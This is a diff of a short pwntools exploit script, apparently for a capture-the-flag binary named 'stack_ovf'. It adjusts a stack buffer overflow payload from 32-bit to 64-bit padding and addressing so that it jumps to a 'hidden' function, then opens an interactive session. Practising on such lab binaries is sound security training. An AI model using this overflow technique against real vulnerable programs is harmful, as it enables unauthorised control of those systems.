@@ -1,4 +1,5 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
 from pwn import *
 import argparse
@@ -19,8 +20,8 @@ else:
 
 chall = ELF('./stack_ovf', checksec=True)
 
-pd = b'A' * 76
-pd += p32(chall.sym['hidden'])
+pd = b'A' * 72
+pd += p64(chall.sym['hidden'])
 print(f"hidden() address: {hex(chall.sym['hidden'])}")
 p.sendline(pd)
 p.interactive()
